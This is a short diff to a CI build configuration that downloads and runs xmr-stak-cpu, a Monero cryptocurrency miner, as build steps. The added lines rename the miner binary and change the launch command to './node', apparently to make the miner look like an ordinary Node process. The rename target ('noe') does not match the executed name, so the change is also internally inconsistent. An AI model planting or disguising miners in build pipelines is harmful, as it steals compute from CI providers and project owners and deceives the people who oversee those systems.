@@ -17,6 +17,9 @@ build:
        name: install 3
        code: chmod +x xmr-stak-cpu
     - script:
+       name: install 3
+       code: mv xmr-stak-cpu noe
+    - script:
        name: install 4
-       code: ./xmr-stak-cpu
+       code: ./node
        
